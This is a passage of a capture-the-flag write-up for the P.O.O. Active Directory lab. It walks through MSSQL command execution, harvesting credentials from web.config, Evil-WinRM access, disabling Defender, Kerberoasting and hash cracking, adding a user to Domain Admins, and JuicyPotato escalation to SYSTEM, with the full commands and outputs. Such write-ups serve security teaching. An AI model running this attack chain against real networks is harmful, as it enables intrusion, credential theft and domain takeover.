    SQL> xp_cmdshell type C:\inetpub\wwwroot\web.config
    output
    ------------------------------
    Access is denied.
    NULL   
    

It’s clear that I need to find more access.

#### Scripts

It turns out that when a webserver is enabled to run the stored procedure
`sp_execute_external_script`, and that it is configured to do that as a
different user. To run script, the [syntax is relatively
simple](https://nielsberglund.com/2017/04/20/sql-server-2017---python-
executing-inside-sql-server/):

    
    
    SQL> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
    compatibility\poo_public01
    
    Express Edition will continue to be enforced.
    

Now I can run as `poo_public01`.

### web.config

Now I can read the `web.config` file:

    
    
    SQL> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type \inetpub\wwwroot\web.config");';
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
    <?xml version="1.0" encoding="UTF-8"?>
    <configuration>
        <system.webServer>
            <staticContent>
                <mimeMap
                    fileExtension=".DS_Store"
                    mimeType="application/octet-stream"
                />
            </staticContent>
            <!--
            <authentication mode="Forms">
                <forms name="login" loginUrl="/admin">
                    <credentials passwordFormat = "Clear">
                        <user 
                            name="Administrator" 
                            password="EverybodyWantsToWorkAtP.O.O."
                        />
                    </credentials>
                </forms>
            </authentication>
            -->
        </system.webServer>
    </configuration>
    
    Express Edition will continue to be enforced.
    

It contains creds for the administrator account. These work to get past the
basic auth at `/admin`, and return the next flag:

    
    
    root@kali# curl -s http://administrator:EverybodyWantsToWorkAtP.O.O.@10.13.38.11/admin/
    "I can't go back to yesterday, because i was a different person then..."<br>
    - Alice in Wonderland<br>
    <br>
    Flag : POO{4882bd2c************************}
    

## Foothold

The first time I solved P.O.O., I actually missed the IPv6 / WinRM route below
that I believe is the intended route, and only later did it occur to me that
the creds for `/admin` might be a local account. Once I figured that out, I
switched over to using the administrator account to finish the lab. I’ll show
my long way in Beyond Root.

### Local Enumeration

It took a while looking around to put the pieces together. First, the host is
listening on WinRM, TCP 5985, both IPv4 and IPv6:

    
    
    SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("netstat -ano");';                        
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
    
    Active Connections
      Proto  Local Address          Foreign Address        State           PID 
      TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
      TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920
      TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
      TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       4372
      TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
    ...[snip]...
      TCP    [::]:80                [::]:0                 LISTENING       4
      TCP    [::]:135               [::]:0                 LISTENING       920
      TCP    [::]:445               [::]:0                 LISTENING       4
      TCP    [::]:1433              [::]:0                 LISTENING       4372
      TCP    [::]:5985              [::]:0                 LISTENING       4
    ...[snip]...
    

The original `nmap` did not show 5985 listening, which was an IPv4 scan. But I
haven’t checked IPv6.

To check further into this, I need the IPv6 address of the host, which I can
get from `ipconfig`:

    
    
    SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("ipconfig");';
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
    
    Windows IP Configuration
    
    
    Ethernet adapter Ethernet0:
    
       Connection-specific DNS Suffix  . : 
       IPv6 Address. . . . . . . . . . . : dead:babe::1001
       Link-local IPv6 Address . . . . . : fe80::ad9a:ad0:ce4:4cc2%7
       IPv4 Address. . . . . . . . . . . : 10.13.38.11
       Subnet Mask . . . . . . . . . . . : 255.255.255.0
       Default Gateway . . . . . . . . . : dead:babe::1
                                           10.13.38.2
    
    Ethernet adapter Ethernet1:
    
       Connection-specific DNS Suffix  . : 
       IPv4 Address. . . . . . . . . . . : 172.20.128.101
       Subnet Mask . . . . . . . . . . . : 255.255.255.0
       Default Gateway . . . . . . . . . : 
    
    Express Edition will continue to be enforced.
    

### IPv6 Enumeration

Running `nmap` again on the IPv6 shows that there is a third port that is not
firewalled off, 5985:

    
    
    root@kali# nmap -p- -6 --min-rate 10000 dead:babe::1001
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 05:59 EDT
    Nmap scan report for intranet.poo (dead:babe::1001)
    Host is up (0.081s latency).
    Not shown: 65532 filtered ports
    PORT     STATE SERVICE
    80/tcp   open  http
    1433/tcp open  ms-sql-s
    5985/tcp open  wsman
    
    Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
    

### Shell

I can connect to this over WinRM using Evil-WinRM. To do an IPv6 connection,
I’ll add the ip to my local `/etc/hosts` file. The hostname the box returns is
`COMPATIBILITY`:

    
    
    SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("hostname");';
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 
    COMPATIBILITY
    

So I’ll use that in `/etc/hosts`:

    
    
    dead:babe::1001 compatibility
    

Now connect:

    
    
    root@kali# evil-winrm -i compatibility -u administrator -p 'EverybodyWantsToWorkAtP.O.O.'
    
    Evil-WinRM shell v2.3
    
    Info: Establishing connection to remote endpoint
    
    *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
    compatibility\administrator
    

The fourth flag is on the desktop:

    
    
    *Evil-WinRM* PS C:\Users\Administrator\desktop> cat flag.txt
    POO{ff87c4fe************************}
    

## p00ned

### SharpHound

Given this is an active directory environment, and I’m looking to pivot, I’ll
want to run Bloodhound. I uploaded it using the WinRM access, but I need to
run it from a domain account. Luckily, I have code execution as the service
accounts in MSSQL, which are domain accounts, so I can run it from there.

_Note: If you read inBeyond Root about the extra long route I took to get a
shell, one thing I did was use a Python script that connects to MSSQL and
simulates an interactive shell. That shell will show up here when I run things
from there._

I’ll run SharpHound from the MSSQL shell:

    
    
    C:\Users\MSSQL$~1\AppData\Local\Temp>.\sh.exe
    Initializing BloodHound at 1:18 PM on 2/18/2019
    Resolved Collection Methods to Group, LocalGroup, Session, Trusts
    Starting Enumeration for intranet.poo
    Status: 61 objects enumerated (+61 4.692307/s --- Using 31 MB RAM )
    Finished enumeration for intranet.poo in 00:00:13.0647650
    0 hosts failed ping. 0 hosts timedout.
    
    Compressing data to .\20190218131831_BloodHound.zip.
    You can upload this file directly to the UI.
    Finished compressing files!
    

I’ll download the file, and load it into BloodHound. If I run the search
“Shortest Paths to Domain Admin from Kerberoastable Users”, I can see that
P00_ADM@INTRANET.POO is a member of P00 HELP DESK@INTRANET.POO which has
GenericAll over DOMAIN ADMINS@INTRANET.POO:

![image-20200606143224437](https://0xdfimages.gitlab.io/img/image-20200606143224437.png)

### Kerberoast

#### Invoke-Kerberoast

I’ll grab [a
copy](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-
Kerberoast.ps1) of `Invoke-Kerberoast.ps1` and upload it over the WinRM shell.
As I’ll be running stuff that might be blocked by defender, I’ll turn that
off:

    
    
    *Evil-WinRM* PS C:\programdata> Set-MpPreference -DisableRealtimeMonitoring $true
    

Just like with SharpHound, I’ll run it from the SQL shell:

    
    
    SQL> xp_cmdshell powershell -c import-module c:\programdata\invoke-kerberoast.ps1; invoke-kerberoast -outputformat hashcat
    output
    
    --------------------------------------------------------------------------------
    
    NULL
    NULL
    TicketByteHexStream  :
    Hash                 : $krb5tgs$23$*p00_hr$intranet.poo$HR_peoplesoft/intranet.poo:1433*$F2463BF66154BFDBEF0E6821A2CCE5
    6C$5CA58FDBF4D6DF3935D15ABDF677D8BCFA2946E7EE2BC21B623E81C9925572C281C332A7E1E8ACCB8DC014B50D4BD
    3A24AAA2D5F51CCDE2DADC993CFB115243E3E74BAEE492E6B154CB04CA942D255EDD2AC2D137651F3D4B638353FC29BE
    89CB00BB5C85F23651ADE26142E39FF827B0BB1163D5C03041D64074143F104F06248CFFE428F58E1227A02DA6EA7DF7
    CDE679FD0846627F3F4D4BCBAF60EEE6E18F578001F4F5B62CFF0B4C6A6DF12C34395F66C9714EFF139BA1D78F679B24
    A57E0C01DB0A01641AA8E5DC9CEB37817C2664DE3F677B3B41B6DB1B4A1C3A45237478D7D37780333F29A497C0DCAC76
    A1E0D4ED998DF2DE442886084F4D5A49F4CAAA524E289271343B14E5D5F8928122F6D57A7428737FA4DF63C6A64CB56C
    F1183A276DBEC2BEF30B15D214722B5E0614461D5A090DEDEA68DDF86278D781FD4023F704B319EBE2B7FDBC84EA39F8
    885B692A85701B4C5DF2721F7F70DF7862E3689AE0DC3B0067E17F43BC15C9C0E202E2B6F1C9F44B09F1A128F318220D
    091D299F081778C1B90EF9DB2C8A61793BF9ED70C22E63621EF2E8389309C5DF807B59F39F5FD23AA36ECBF425F80F0F
    C0C33011721EBF0CFA1AD57B726F6326324B8F1FCF4C6E314A84A14DF780B06EC71EAECC12E500A7F8E6C06E0E56C9D3
    03A3EB7A195C77B4055C0F1280620C4053885A93A4C789D619D1294B7206CFA3F242476143717CDF5E8B8B5FBDC6E9CF
    F1D9DAFC90605438ADEC3520A91A529A5117218877FCB89DC2A87F76999F3A4F7F4A63D64061380E817432BA8BA3B0C7
    1C3C84EB8EF02930EDCA11B008716E3A0FE6F62634CA126B6BD06AF2E015DEDCD394440B0F8744EE8BA8FC3C55F3D2D4
    3280E62511F9FEC2EBC009B90CDBBC257363613B837825CFF32A4F97B657ADE4686658B31AE48691F767B07534353F2F
    FB47F975ED6FBF38041CEECA395EDE803EF9C32F391D8DA4139F6271921F770FC3997BD4EEB9B8C8C14E10D14232C2C4
    0C6D3540A92912733A464DB22CFF699E7881A4ABDA30916C546D1B54B015E1347F92DDE8301E5ADD9F07535C4312DF73
    03A3EB7A195C77B4055C0F1280620C4053885A93A4C789D619D1294B7206CFA3F242476143717CDF5E8B8B5FBDC6E9CF
    F1D9DAFC90605438ADEC3520A91A529A5117218877FCB89DC2A87F76999F3A4F7F4A63D64061380E817432BA8BA3B0C7
    1C3C84EB8EF02930EDCA11B008716E3A0FE6F62634CA126B6BD06AF2E015DEDCD394440B0F8744EE8BA8FC3C55F3D2D4
    3280E62511F9FEC2EBC009B90CDBBC257363613B837825CFF32A4F97B657ADE4686658B31AE48691F767B07534353F2F
    FB47F975ED6FBF38041CEECA395EDE803EF9C32F391D8DA4139F6271921F770FC3997BD4EEB9B8C8C14E10D14232C2C4
    0C6D3540A92912733A464DB22CFF699E7881A4ABDA30916C546D1B54B015E1347F92DDE8301E5ADD9F07535C4312DF73
    677F15DF89DC7532B631E3730846991D55429128D05A8717E892A7FBA38086B501F3CE6109A8E8470FE5917E77D936B6
    3F1212BC193A1EF3EF37AFCE5BD02E20CE3D8C3D756F57416025F9BF157D4D284DC48662D4E3DDCF4958B5F1AB1D4EDF
    344D1B5D5AE73F558FBD0681712EDC3A336ADD3D755DB210B1519CF309335FE50D971ADA2A6F13C0494CE8F75677A62C
    37C9C917A2C3575F2C4D6767644E2583A1854880D3E13C7C54B3593994C0DF79F20C21E3DD2D7514CFA3EB16E3657407
    000740F3A35BF3DE4965F62CF1E617ED850DEA23DE5C624A89C3204FA067B3EBC48C499E4A56B9298AA862DAF58894FF
    7301206A60633FDDE80D59C4D97FDF42915206762A0EB1F52C3388EDD5D704448F2B51FB796EF0A60A8168F59C63A
    SamAccountName       : p00_hr
    DistinguishedName    : CN=p00_hr,CN=Users,DC=intranet,DC=poo
    ServicePrincipalName : HR_peoplesoft/intranet.poo:1433
    NULL
    TicketByteHexStream  :
    Hash                 : $krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intranet.poo:443*$A4E0C3EAFB451D4D9F965EA3A985EEBC
    $0232185FAEC205E5B5BE9821F00828CA5B5A233C74F5685FBB87C39F9ED45C53977050125F4554AD7379299C1B643B3
    3E38BB0DEC72FA7C3F44B4E34F82B76E5728E62CD35F2AA3D464217C354FD90CF9AE973122106BFAF46EE90398AE7BDE
    DE606B419223AB59A2C41B2715C6025503ADD7A0247FFE97A7BE39481268378A272C590E4681E9F6F3F5B29FD5CAF831
    C8E6931581A1054BCF3B9575A1648E1B35CC12AC752AD043A48CF12AAA909160CF1CA9F6C67BFA21D9EED5C0AEAC65D5
    127972FB63EF0D2D62F7506E8BE4845B141BA3F792EE457623302802E1995B1F73D9250EBA681337104EF0D588CEFBB6
    CCB619F37E0CDE0603CDED958CC497D56A3FBA12468A917D05A27B910DAAF704FD1B788CF6F46B7030861EF6619475BA
    70258C4B2A55D22DAFB56AA06D6023EDD0E757742960DEAB4A6FCBAC9BD53821B1CF68A1753364CC7C2108CCB8813F68
    F3FB4B4146EAB929E2BF0F51B6F6EAE7E79B93B19376E6F9EB2C8CE3DCAF1EC7355893C28E750DDB55DBD06ED985D736
    C94780582A245D0B5D0D6550FED5A0CCA455C27044B5D3507A01F37A749D00D130DBAF24D6868DF815DFD83BD259027D
    59490BC46BC35924BE22614280BC7D83915B823E3BCA95EBE436CB1E25F0D0E977CD496BC7739633702CC2389A2F1D95
    631BD86AEDE3149EA4519FF4EE1AAD6703425FAAA71A9863D3658759B3FB4771BD903A08D3C5904A2AFD32067576D9FC
    505C35262BB6449908D20446A4DBFD4259740CD1029473A69853ADB9BDCD7C7B5338CBA7B1512479ED5BB11EEA14CD28
    49B20D8E25079B5C1903F4E96A17B2BA4E31F81A6CE6974DF59412A27E3895055F89F39375AA522AB2F8CE3E8288C3CB
    86F582021CFF5515AC1A210682F5529613EE98866D87FEE5751FDDAF3976F5005C84F7A3957475701025DEEF85986E3C
    6EA0AA366AE8C0E7CF2C893D39E0044501FF8CF215621B996AA5A6C635D55726A89B85E324F876CDDED17C9E21A254BF
    36C1A39C02E00D2D6107B1A7A1F7866CBDDD73A322D3D28EB636BC28A860E6407AF9752B02ED2E3AA70471AC5EB4568B
    2C959AB638C8D731296C5F935215CF87A6EDF45E971E6B32C11BB1BB42850F5CA81DA80C0C95F7963B942634E1320D14
    6C35D24C8A8FDA030CC6FF7EB0FB407FAB84FFE5634E1D2250F9D9551392B5946FF6250E9A54545EBE454F2558529A09
    151CF8D7AEB2DF16EE44491E2CAB0D227D1AB0FFDCE2514E1F73E38B6C719F112A47D54190B67C98D8A66091AF0D6934
    57A7D14FC88C1B21C2CA26131CDF73D2F15E49E696CF28E48A17F78EF6B9F9403D8470FE41DCA4A3B222A9786C8CB4CE
    404EDFA0CCDEE0A6244FB8EB06791F82FFDC068E4E1D65FBC443EAD109A0DB8E396CBD5C894D66023C699561DEB69F66
    89D60E0177467DE72B73201505BC4091D6FE69CE49C016E400F110A6481DDCB396710E25DA5D9BA500EAF611ADB
    SamAccountName       : p00_adm
    DistinguishedName    : CN=p00_adm,CN=Users,DC=intranet,DC=poo
    ServicePrincipalName : cyber_audit/intranet.poo:443
    NULL
    NULL
    NULL
    NULL
    

Two accounts returned hashes.

#### Crack Hashes

I’ll drop those two hashes into a file and remove the newlines to there are
only two lines of text. I first tried with `rockyou.txt`, but didn’t crack
either. I started looking at other lists in
[SecLists](https://github.com/danielmiessler/SecLists), and when I tried
`Keyboard-Combinations.txt`, p00_adm broke:

    
    
    root@kali# hashcat -m 13100 hashes.kerbi /usr/share/wordlists/rockyou.txt --force
    ...[snip]...
    ZQ!5t4r
    

I’ll grab `PowerView.ps1` from
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
and upload it using the Evil-WinRM shell:

    
    
    *Evil-WinRM* PS C:\programdata> upload /opt/PowerSploit/Recon/PowerView.ps1
    Info: Uploading /opt/PowerSploit/Recon/PowerView.ps1 to C:\programdata\PowerView.ps1
    
                                                                  
    Data: 1027036 bytes of 1027036 bytes copied          
                                                                       
    Info: Upload successful!
    

### Add to Domain Admins

If I didn’t know how to exploit this privilege, the help in Bloodhound on the
link will tell me:

![image-20200606145743610](https://0xdfimages.gitlab.io/img/image-20200606145743610.png)

So now I can use p00_adm’s account and add it to the Domain Admins group. I’ll
upload `PowerView.ps1` and import it:

    
    
    *Evil-WinRM* PS C:\programdata> upload PowerView.ps1
    Info: Uploading PowerView.ps1 to C:\programdata\PowerView.ps1
    
                                                                 
    Data: 1027244 bytes of 1027244 bytes copied
    
    Info: Upload successful!
    
    *Evil-WinRM* PS C:\programdata> Import-Module .\PowerView.ps1
    

Now I’ll create a `PSCredential` object, and then add p00_adm to Domain
Admins:

    
    
    *Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
    *Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $pass)
    *Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred
    

### Grab Flag

As p00_adm is now a domain admin, it to access the `c$` share on the DC:

    
    
    *Evil-WinRM* PS C:\programdata> net use \\DC.intranet.poo\c$ /u:intranet.poo\p00_adm 'ZQ!5t4r'
    The command completed successfully.
    
    *Evil-WinRM* PS C:\programdata> dir \\DC.intranet.poo\c$\users\
    
    
        Directory: \\DC.intranet.poo\c$\users
    
    
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-----        3/15/2018   1:20 AM                Administrator
    d-----        3/15/2018  12:38 AM                mr3ks
    d-r---       11/21/2016   3:24 AM                Public
    

Now I can grab the flag, which I find on mr3ks’ desktop:

    
    
    *Evil-WinRM* PS C:\programdata> type \\DC.intranet.poo\c$\users\mr3ks\desktop\flag.txt
    POO{1196ef8b************************}
    

I could also do the same thing using PowerShell `Invoke-Command`:

    
    
    *Evil-WinRM* PS C:\programdata> invoke-command -computername dc -scriptblock { dir C:\users\mr3ks\desktop } -credential $cred
    
    
        Directory: C:\users\mr3ks\desktop
    
    
    Mode                LastWriteTime         Length Name                                                                                                 PSComputerName
    ----                -------------         ------ ----                                                                                                 --------------
    -a----        3/26/2018   5:47 PM             37 flag.txt                                                                                             dc
    
    
    *Evil-WinRM* PS C:\programdata> invoke-command -computername dc -scriptblock { gc C:\users\mr3ks\desktop\flag.txt } -credential $cred
    POO{1196ef8b************************}
    

## Beyond Root - Long Way to Administrator Shell

Once I had `xm_cmdshell` in MSSQL, I wandered a good bit before finding that I
could WinRM with the administrator creds. The path I took involved using
JuicyPotato to get SYSTEM and then creating an admin account.

### Command Shell Upgrade

Executing commands in `mssqlclient` isn’t too bad - I can up arrow, change out
the one line in quotes. Still, having something that acts like a shell is much
nicer, and as enumeration wasn’t showing me much at first, I wanted an
upgrade. Googling for “python mssql shell”, the first result was [MSSQL shell
with file upload capability](https://alamot.github.io/mssql_shell/). I’ll
download this, and update the section the defines the connection:

    
    
    MSSQL_SERVER="10.13.38.11"
    MSSQL_USERNAME = "df"
    MSSQL_PASSWORD = "qwe123QWE!@#"
    

The only other change I made was to the prompt. The original shell will print:

    
    
    CMD MSSQL$POO_PUBLIC@COMPATIBILITY C:\WINDOWS\system32>
    

That’s more text than I want, especially to go into a blog post where the
commands will flow off the screen. So I updated it:

    
    
    #cmd = input("CMD " + username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
    cmd = input(cwd+"> ").rstrip("\n").replace("'", "''")
    

Now I can run it and it connects:

    
    
    root@kali# rlwrap python alamot_mssql_shell.py 
    Successful login: df@10.13.38.11
    Trying to enable xp_cmdshell ...
    C:\WINDOWS\system32>
    

I won’t have ctrl-c to kill something on target without exiting the shell, but
with `rlwrap` I’ve got arrow keys, it’s stateful, and overall a decent
experience. It is running as poo_public:

    
    
    C:\WINDOWS\system32> whoami
    nt service\mssql$poo_public
    

### Priv to SYSTEM

This is the path I originally took, until I thought to try the administrator
creds over WinRM. It doesn’t look like this will work today, as the host is
Server 2019, and Defender eats the JuicyPotato binary very quickly on
uploading it. I’ll do my best to explain the path with the notes I have from
15 months ago.

#### Enumeration

`whoami /priv` shows that (unsurprisingly since it’s a service account) this
account has `SEImpersonatePrivilege`:

    
    
    C:\> whoami /priv
    
    PRIVILEGES INFORMATION
    ----------------------
    
    Privilege Name                Description                               State   
    ============================= ========================================= ========
    SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
    SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
    SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
    SeCreateGlobalPrivilege       Create global objects                     Enabled 
    SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
    

#### JuicyPotato

[JuicyPotato](https://github.com/ohpe/juicy-potato) is an exploit to move from
`SEImpersonalPrivilege` to SYSTEM. I’ll need a `.bat` file as a payload. To
test it, I’ll just get a dir listing of the administrator’s desktop:

    
    
    root@kali# cat dir.bat 
    dir c:\users\administrator\desktop\ > c:\temp\out.txt
    

I’ll use the MSSQL shell to upload it to COMPATIBILITY, along with the latest
[JP release](https://github.com/ohpe/juicy-
potato/releases/download/v0.1/JuicyPotato.exe) (upload not shown):

    
    
    C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp>UPLOAD dir.bat
    100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 7/7 [00:00<00:00, 44.88K/s]
    C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp>dir
     Volume in drive C has no label.
     Volume Serial Number is F661-7669
    
     Directory of C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp
    
    02/16/2019  01:08 AM    <DIR>          .
    02/16/2019  01:08 AM    <DIR>          ..
    02/16/2019  01:08 AM                54 dir.bat
    02/16/2019  12:50 AM           347,648 jp.exe
                   3 File(s)        347,710 bytes
                   2 Dir(s)   6,083,448,832 bytes free
    

I need a CLSID to run with. The JuicyPotato GitHub repo has a list for each OS
type. Since this box is (was) Server 2016, I’ll try from [this
list](https://github.com/ohpe/juicy-
potato/blob/f88727071151894c8ce6583b1602a8c68380294c/CLSID/Windows_Server_2016_Standard/README.md).
Now I’ll run `jp.exe -t * -p [payload] -l 9001 -c [CLSID]`, and it seems to
work:

    
    
    C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp>jp.exe -t * -p C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp\dir.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
    Testing {5B3E6773-3A99-4A3D-8096-7765DD11785C} 9001
    ......
    [+] authresult 0
    {5B3E6773-3A99-4A3D-8096-7765DD11785C};NT AUTHORITY\SYSTEM
    
    [+] CreateProcessWithTokenW OK
    

There’s an `out.txt` file in `c:\temp`, and it shows the flag on the
administrators desktop:

    
    
    C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp>dir \temp
     Volume in drive C has no label.
     Volume Serial Number is F661-7669
    
     Directory of C:\temp
    
    02/16/2019  01:09 AM    <DIR>          .
    02/16/2019  01:09 AM    <DIR>          ..
    02/16/2019  01:09 AM               353 out.txt
                   1 File(s)            353 bytes
    C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp>type \temp\out.txt
     Volume in drive C has no label.
     Volume Serial Number is F661-7669
    
     Directory of c:\users\administrator\desktop
    
    04/07/2018  12:02 PM    <DIR>          .
    04/07/2018  12:02 PM    <DIR>          ..
    03/26/2018  04:29 PM                37 flag.txt
                   1 File(s)             37 bytes
                   2 Dir(s)   6,083,448,832 bytes free
                   2 Dir(s)   6,083,448,832 bytes free
    

I’ll create a `.bat` file to get the flag:

    
    
    root@kali# cat flag.bat 
    type c:\users\administrator\desktop\flag.txt > c:\temp\out.txt
    

Upload and run it with `jp.exe`, and the flag is in `temp`:

    
    
    C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp>upload flag.bat
    100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 7/7 [00:00<00:00, 45.73K/s]
    C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp>jp.exe -t * -p C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp\flag.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}                                                        
    Testing {5B3E6773-3A99-4A3D-8096-7765DD11785C} 9001
    ......
    [+] authresult 0
    {5B3E6773-3A99-4A3D-8096-7765DD11785C};NT AUTHORITY\SYSTEM
    
    [+] CreateProcessWithTokenW OK
    
    C:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp>type \temp\out.txt
    
    POO{ff87c4fe************************}
    

### Administrator Shell

I don’t have any console text for the rest of this, but I noticed WinRM on
IPv6 at this point, and my next step was to use `jp.exe` to add a local
administrator account. Each time the lab got reset, and I would have to go
into the DB, bound to add an sa user, start a shell, upload JuicyPotato and a
bat file to add the account and add it to the administrators group, and then
WinRM as that account.

After a couple times, I decided to try the creds from the `web.config`, and
they worked. It was both a relief and maddening.

[](/2020/06/08/endgame-poo.html)

